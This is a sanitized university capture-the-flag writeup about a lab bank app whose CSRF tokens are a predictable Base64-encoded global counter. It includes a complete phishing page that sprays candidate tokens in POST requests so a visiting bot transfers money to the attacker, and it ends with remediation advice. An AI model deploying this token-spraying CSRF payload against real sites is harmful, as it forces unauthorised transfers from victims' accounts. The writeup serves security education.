# Historical report: Predictable Csrf Tokens

> Sanitized archival COMP6443 lab writeup. The larger assessment is team work; no exclusive individual authorship is inferred. Reported success is historical and has not been freshly reproduced. Addresses, accounts, identities, flags, encoded evidence, and screenshots are omitted or replaced. Code is illustrative and may contain draft errors. Read [review notes](../docs/report-review-notes.md).

# Phish Me Writeup

## Challenge Overview

The goal of this challenge was to trick the bot into transferring money from its own account to my account.  
The application exposed two key features:

1. A **phishing form** that allowed me to submit any URL for the bot to visit.
2. A **money transfer form** protected by a CSRF token.

At first glance, the CSRF token looked like a normal anti-CSRF defence, but further testing showed that it was weak and predictable.

---

## Initial Analysis

The homepage contained the following transfer form:

```html
<form method="POST" action="/api/transfer">
    <input type="hidden" name="csrf_token" value="ODM3Ng==">
    <input type="text" name="username" placeholder="Username to Send To (can be yourself)">
    <input type="number" name="amount" placeholder="Amount" step="1">
    <input type="submit" value="Transfer 💸">
</form>
```

The transfer request looked like this:

```http
POST /api/transfer HTTP/2
Host: lab.example.invalid
Content-Type: application/x-www-form-urlencoded

csrf_token=ODM3Ng%3D%3D&username=LAB_USER&amount=1
```

Decoding the token revealed that it was simply Base64-encoded decimal text:

- `ODM3Ng==` → `8376`

Repeated testing showed two important properties:

1. The CSRF token changed every time the page was refreshed.
2. A token could only be used once.

However, the token was **not random**. It appeared to be a **globally incrementing integer**, encoded with Base64.  
When I refreshed quickly and repeatedly, the value often increased by `+1`.  
When other users were also interacting with the challenge, the value sometimes jumped by more than one, indicating that the counter was global.

This meant the defence was not based on strong unpredictability, but on a weak shared counter.

---

## Failed Approaches

Several ideas were tested and discarded before reaching the intended solution.

### 1. Reusing old tokens

Submitting the same token twice immediately triggered a CSRF error, so replaying previously observed values did not work.

### 2. Using GET requests

I tested whether `/api/transfer` would also accept GET parameters, but the endpoint returned:

```http
405 Method Not Allowed
Allow: OPTIONS, POST
```

So the transfer endpoint was POST-only.

### 3. Using a static phishing page with a small token range

I first tried sending the bot to a simple page that sprayed a narrow range of candidate CSRF tokens.  
This was unreliable because the global counter kept moving while the bot delay was unknown.

---

## Key Insight

The key weakness was that the CSRF token was:

- **predictable**
- **globally shared**
- **only weakly encoded**
- **usable if guessed correctly at the right moment**

Since the bot would visit any URL I submitted, I could host my own phishing page and make it automatically send many POST requests to `/api/transfer`, each with a different candidate token.

Eventually, one of those guessed tokens would match the bot’s current valid token and the transfer would succeed.

This turned the problem into a **token spraying / token collision attack** against a weak CSRF implementation.

---

## Exploitation Strategy

I hosted a malicious page on GitHub Pages and submitted its URL through the challenge’s phishing form.

The attack page automatically:

1. Generated a large range of candidate CSRF tokens.
2. Encoded each integer using Base64.
3. Sent POST requests to `https://lab.example.invalid/api/transfer`.
4. Used my own username as the transfer target.
5. Repeated this rapidly until one token matched the bot’s valid current token.

The final payload was:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Transferring...</title>
</head>
<body>
    <div id="status">Preparing the historical lab example...</div>
    <ul id="log"></ul>

    <script>
        const ME = "LAB_USER"; 
        const START = 8974; 
        const COUNT = 500;  
        const AMOUNT = 1;
        const targetUrl = "https://lab.example.invalid/api/transfer";

        async function doPhish() {
            const statusDiv = document.getElementById('status');
            const logList = document.getElementById('log');

            statusDiv.innerText = `Testing candidate tokens in range ${START} - ${START + COUNT} in the historical lab...`;

            for (let i = 0; i < COUNT; i++) {
                const tokenInt = START + i;
                const token = btoa(tokenInt.toString()); 

                const params = new URLSearchParams();
                params.append('csrf_token', token);
                params.append('username', ME);
                params.append('amount', AMOUNT);

                fetch(targetUrl, {
                    method: "POST",
                    mode: "no-cors",
                    body: params,
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                });

                if (i % 10 === 0) {
                    const li = document.createElement('li');
                    li.innerText = `Candidate submitted: ${tokenInt} (${token})`;
                    logList.appendChild(li);
                }

                await new Promise(r => setTimeout(r, 50)); 
            }
            statusDiv.innerText = "Historical example finished.";
        }

        window.onload = doPhish;
    </script>
</body>
</html>
```

---

## Why the Attack Worked

The application assumed that a changing CSRF token was sufficient protection.  
However, the implementation failed because the token was derived from a predictable global counter rather than from a cryptographically random per-session secret.

As a result:

- the attacker could estimate the current token range
- the bot would willingly visit an attacker-controlled page
- the attacker-controlled page could submit many POST requests in sequence
- one of those guesses would eventually collide with the valid token

Once the collision occurred, the application accepted the transfer request and moved funds from the bot’s account to mine.

---

## Result

After submitting the phishing URL to the bot and waiting for it to visit my hosted page, the balance increased and the challenge displayed the flag:

```text
[REDACTED LAB FLAG]
```

My balance became `$111`, confirming that the transfer had succeeded.

---

## Security Impact

This challenge demonstrates that a CSRF token is only effective if it is:

- unpredictable
- session-bound
- user-bound
- resistant to guessing
- not reusable by unrelated clients

A globally incrementing counter, even if Base64-encoded and single-use, is not a secure CSRF defence.

---

## Remediation

A secure implementation should:

1. Generate CSRF tokens using a cryptographically secure random source.
2. Bind each token to the user session.
3. Validate that the submitted token belongs to the current authenticated user.
4. Expire tokens safely without exposing predictable structure.
5. Consider additional browser-side protections such as SameSite cookies and origin checks.

---

## Final Notes

The important lesson from this challenge is that **“changing token” does not mean “secure token.”**  
If the value is predictable, an attacker may still be able to win through spraying, timing, or collision attacks, especially when a bot can be induced to visit an attacker-controlled page.
